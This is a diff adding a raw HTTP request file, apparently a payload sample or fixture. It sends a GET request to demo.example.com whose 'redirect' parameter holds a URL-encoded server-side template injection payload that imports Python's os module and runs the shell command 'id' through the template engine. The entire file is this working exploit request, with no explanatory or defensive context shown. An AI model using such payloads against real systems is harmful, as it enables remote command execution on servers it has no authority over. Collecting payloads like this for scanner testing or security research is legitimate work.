@@ -1,0 +1,4 @@
+GET /a?redirect=%7B%25%2Bimport%2Bos%2B%25%7D%7B%7Bos.popen%28%27id%27%29.read%28%29%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
